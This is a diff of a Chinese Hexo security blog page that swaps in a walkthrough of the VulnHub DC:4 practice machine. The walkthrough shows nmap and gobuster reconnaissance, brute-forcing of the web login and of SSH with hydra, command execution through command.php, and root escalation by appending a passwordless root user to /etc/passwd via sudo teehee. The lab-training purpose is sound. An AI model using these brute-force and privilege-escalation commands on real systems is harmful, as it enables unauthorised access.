@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Java 安全 JNDI 注入, 让我再浪一会">
-    <meta name="description" content="Java 安全 JNDI 注入">
+    <meta name="keywords" content="VulnHub - DC:4, 让我再浪一会">
+    <meta name="description" content="VulnHub - VulnOS:4">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Java 安全 JNDI 注入 | 让我再浪一会</title>
+    <title>VulnHub - DC:4 | 让我再浪一会</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -290,12 +290,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Java 安全 JNDI 注入</h1>
+                    <h1 class="description center-align post-title">VulnHub - DC:4</h1>
                 </div>
             </div>
         </div>
@@ -319,12 +319,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Java-%E5%AE%89%E5%85%A8/">
-                                <span class="chip bg-color">Java 安全</span>
+                            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA/">
+                                <span class="chip bg-color">渗透测试靶场</span>
                             </a>
                         
-                            <a href="/tags/Java-JNDI-%E6%B3%A8%E5%85%A5/">
-                                <span class="chip bg-color">Java JNDI 注入</span>
+                            <a href="/tags/VulnHub/">
+                                <span class="chip bg-color">VulnHub</span>
                             </a>
                         
                     </div>
@@ -335,8 +335,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Java-%E5%AE%89%E5%85%A8/" class="post-category">
-                                Java 安全
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA/" class="post-category">
+                                渗透测试靶场
                             </a>
                         
                     </div>
@@ -357,7 +357,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    9
+                    416
                 </div>
                 
 
@@ -382,7 +382,65 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Java-安全-JNDI-注入"><a href="#Java-安全-JNDI-注入" class="headerlink" title="Java 安全 JNDI 注入"></a>Java 安全 JNDI 注入</h1><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2>
+                <h1 id="VulnHub-DC-4"><a href="#VulnHub-DC-4" class="headerlink" title="VulnHub - DC:4"></a>VulnHub - DC:4</h1><h2 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h2><ul>
+<li><p>靶场地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-4,313/">VulnHub 链接</a></p>
+</li>
+<li><p>难度：简单</p>
+</li>
+<li><p>靶机目标：获取 1 个flag</p>
+</li>
+</ul>
+<h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h2><h3 id="2-1-主机发现"><a href="#2-1-主机发现" class="headerlink" title="2.1 主机发现"></a>2.1 主机发现</h3><p>使用 nmap 进行探测</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.0.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/02/vulnhub-dc-4/image-20230202070445400.png"></p>
+<h3 id="2-2-端口探测"><a href="#2-2-端口探测" class="headerlink" title="2.2 端口探测"></a>2.2 端口探测</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sC</span> -p- <span class="token parameter variable">-T4</span> <span class="token number">192.168</span>.0.151<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/02/vulnhub-dc-4/image-20230202070558860.png"></p>
+<p>开放了 22 端口与 80 端口</p>
+<h2 id="3-WEB-渗透"><a href="#3-WEB-渗透" class="headerlink" title="3. WEB 渗透"></a>3. WEB 渗透</h2><p>访问 <a target="_blank" rel="noopener" href="http://192.168.0.151/">http://192.168.0.151/</a></p>
+<p><img src="/2023/02/02/vulnhub-dc-4/image-20230202070714292.png"></p>
+<p>直接给了一个登录页面</p>
+<p>探测下技术</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">whatweb http://192.168.0.151/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/image-20230202070755596.png" alt="image-20230202070755596"></p>
+<p>挺干净的，扫描了一下目录没有啥收获</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> <span class="token string">"http://192.168.0.151/"</span> <span class="token parameter variable">-w</span> <span class="token string">"/usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt"</span> <span class="token parameter variable">-x</span> <span class="token string">"php,html,zip"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/02/vulnhub-dc-4/image-20230202071150442.png"></p>
+<p>存在几个页面但是访问进去都需要认证</p>
+<p>那就爆破一下登录</p>
+<p>爆破出来账户为 admin / happy，进入 command.php 发现可以进行任意命令执行</p>
+<p><img src="/2023/02/02/vulnhub-dc-4/image-20230202073442832.png"></p>
+<p>获得 /etc/passwd 发现存在三个用户，看下目录下都有啥</p>
+<p><img src="/2023/02/02/vulnhub-dc-4/image-20230202073707290.png"></p>
+<p>在 jim 用户目录下存在三个文件</p>
+<p><img src="/2023/02/02/vulnhub-dc-4/image-20230202073818704.png"></p>
+<p>在 backups 下找到一个密码字典，尝试用该字典去爆破三个用户</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-L</span> username.txt <span class="token parameter variable">-P</span> password.txt <span class="token parameter variable">-s</span> <span class="token number">22</span> <span class="token parameter variable">-t</span> <span class="token number">20</span> ssh://192.168.0.151<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/02/vulnhub-dc-4/image-20230202081409071.png"></p>
+<p>获取到用户 jim 的密码</p>
+<h2 id="4-提权"><a href="#4-提权" class="headerlink" title="4. 提权"></a>4. 提权</h2><p>查看下根目录下的 mbox</p>
+<p><img src="/2023/02/02/vulnhub-dc-4/image-20230202075033292.png"></p>
+<p>只是一封来自 root 用户的邮件</p>
+<p>在 var 目录下发现存在邮件目录</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /var/mail/jim<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/02/02/vulnhub-dc-4/image-20230202075243781.png"></p>
+<p>这就获取到了 charles 用户的密码，切换到 charles 用户</p>
+<p>查看 sudo 权限</p>
+<p><img src="/2023/02/02/vulnhub-dc-4/image-20230202080353302.png"></p>
+<p>看一下该文件能做什么</p>
+<p><img src="/2023/02/02/vulnhub-dc-4/image-20230202080654474.png"></p>
+<p>可以以 root 权限将内容写入到文件之中，</p>
+<p>这里向 /etc/passwd 中写入一个无密码 root 用户</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"admin::0:0:::/bin/bash"</span> <span class="token operator">|</span> <span class="token function">sudo</span> teehee <span class="token parameter variable">-a</span> /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后切换到 admin 用户获得 root 权限</p>
+<h3 id="4-1-flag"><a href="#4-1-flag" class="headerlink" title="4.1 flag"></a>4.1 flag</h3><p><img src="/2023/02/02/vulnhub-dc-4/image-20230202081121315.png"></p>
+
                 
             </div>
             <hr/>
@@ -408,7 +466,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://nah-v0.github.io/2023/02/02/java-an-quan-jndi-zhu-ru/">https://nah-v0.github.io/2023/02/02/java-an-quan-jndi-zhu-ru/</a>
+                    <a href="https://nahv0.github.io/2023/02/02/vulnhub-dc-4/">https://nahv0.github.io/2023/02/02/vulnhub-dc-4/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -446,12 +504,12 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Java-%E5%AE%89%E5%85%A8/">
-                                    <span class="chip bg-color">Java 安全</span>
+                                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA/">
+                                    <span class="chip bg-color">渗透测试靶场</span>
                                 </a>
                             
-                                <a href="/tags/Java-JNDI-%E6%B3%A8%E5%85%A5/">
-                                    <span class="chip bg-color">Java JNDI 注入</span>
+                                <a href="/tags/VulnHub/">
+                                    <span class="chip bg-color">VulnHub</span>
                                 </a>
                             
                         </div>
@@ -768,19 +826,19 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/02/02/java-kuang-jia-shiro-pian-shiro550-lou-dong-fen-xi/">
+                <a href="/2023/02/02/vulnhub-dc-5/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="Java 框架 Shiro 篇 Shiro550 漏洞分析">
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="VulnHub - DC:5">
                         
-                        <span class="card-title">Java 框架 Shiro 篇 Shiro550 漏洞分析</span>
+                        <span class="card-title">VulnHub - DC:5</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            VulnHub - VulnOS:5
                         
                     </div>
                     <div class="publish-info">
@@ -789,11 +847,27 @@
                         </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            nAh-v0
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA/" class="post-category">
+                                    渗透测试靶场
+                                </a>
+                            
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA/">
+                        <span class="chip bg-color">渗透测试靶场</span>
+                    </a>
+                    
+                    <a href="/tags/VulnHub/">
+                        <span class="chip bg-color">VulnHub</span>
+                    </a>
+                    
                 </div>
                 
             </div>
@@ -805,19 +879,19 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/02/02/fei-gao/java-fan-xu-lie-hua-rmi-pian-rmi-gong-ji/">
+                <a href="/2023/02/02/vulnhub-dc-3/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="Java 反序列化 RMI 篇 RMI 攻击">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="VulnHub - DC:3">
                         
-                        <span class="card-title">Java 反序列化 RMI 篇 RMI 攻击</span>
+                        <span class="card-title">VulnHub - DC:3</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            VulnHub - VulnOS:2
+                            VulnHub - VulnOS:3
                         
                     </div>
                     <div class="publish-info">
@@ -1035,7 +1109,7 @@
             
                 <span id="year">2019-2023</span>
             
-            <a href="/about" target="_blank">nAh-v0</a>
+            <a href="/about" target="_blank">nahv0</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             
